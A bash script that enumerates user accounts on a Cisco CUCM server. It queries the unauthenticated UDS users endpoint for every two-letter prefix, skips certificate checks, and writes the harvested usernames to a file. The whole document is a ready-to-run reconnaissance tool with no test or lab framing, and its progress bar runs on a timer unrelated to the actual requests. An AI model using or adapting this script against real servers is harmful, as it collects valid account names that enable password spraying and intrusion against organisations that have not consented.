#!/bin/bash

# Function to display help menu
display_help() {
    echo "Usage: $0 <CUCM_host> [port] [-debug] [-h]"
    echo
    echo "Arguments:"
    echo "  <CUCM_host>   The IP address or hostname of the CUCM server."
    echo "  [port]        Optional: The port number to connect to (default is 443)."
    echo "  [-debug]      Optional: Display curl commands when executing."
    echo "  [-h]          Display this help menu."
    echo
    echo "Example:"
    echo "  $0 100.79.153.194"
    echo "  $0 myserver.com 8443 -debug"
    exit 1
}

# Check for -h flag or no arguments provided
if [[ "$1" == "-h" ]] || [ "$#" -eq 0 ]; then
    display_help
fi

# Define the CUCM host and optional port, with a default value of 443
CUCM_host=$1
port=${2:-443}  # If no second argument is given, use port 443
debug_mode=$3   # Third argument can be used for the -debug flag

# Validate the CUCM host (either IP or hostname)
if ! [[ "$CUCM_host" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] && ! [[ "$CUCM_host" =~ ^[a-zA-Z0-9.-]+$ ]]; then
    echo "Error: Invalid CUCM host. Please provide a valid IP address or hostname."
    display_help
fi

base_url="https://$CUCM_host:$port/cucm-uds/users?name="

# Initialize an empty array to store usernames
usernames=()

# Define the output file based on the CUCM host IP address
output_file="${CUCM_host}_usernames.txt"

# Function to display a loading bar
show_loading_bar() {
    local total=$1
    local current=0
    local bar_length=50

    while [ $current -le $total ]; do
        # Calculate the percentage and the number of completed bars
        local percent=$((current * 100 / total))
        local filled_length=$((bar_length * current / total))
        local bar=$(printf "%-${bar_length}s" "#" | sed "s/ /#/g")

        # Print the loading bar
        printf "\r[%-${bar_length}s] %d%%" "${bar:0:filled_length}" "$percent"
        current=$((current + 1))
        sleep 0.1  # Adjust this sleep duration as needed for smoother updates
    done
    echo ""  # Move to the next line after completion
}

# Function to fetch and parse usernames
get_users_api() {
    local total_checks=676  # Total combinations (26 letters * 26 letters)
    show_loading_bar $total_checks &  # Start the loading bar in the background
    loading_pid=$!  # Capture the PID of the loading bar

    current_checks=0  # Initialize check counter

    for char1 in {a..z}; do
        for char2 in {a..z}; do
            # Build the curl command
            curl_cmd="curl -sk --max-time 2 \"$base_url$char1$char2\""

            # If debug mode is enabled, print the curl command
            if [[ "$debug_mode" == "-debug" ]]; then
                echo "Executing: $curl_cmd"
            fi

            # Execute the curl command and store response
            response=$(eval $curl_cmd)
            
            if [[ $? -eq 0 ]]; then
                # Extract usernames from the XML response
                extracted_usernames=$(echo "$response" | grep -oP '(?<=<userName>)[^<]+(?=</userName>)')
                if [[ -n $extracted_usernames ]]; then
                    usernames+=($extracted_usernames)
                    # Save usernames to the file
                    echo "$extracted_usernames" >> "$output_file"
                fi
            else
                echo "CUCM Server $CUCM_host is not responding"
            fi

            # Increment the check count for the loading bar
            ((current_checks++))
        done
    done

    # Wait for the loading bar to finish and kill it
    wait $loading_pid
}

# Call the function
get_users_api

# Print the results
echo "Usernames saved to $output_file"
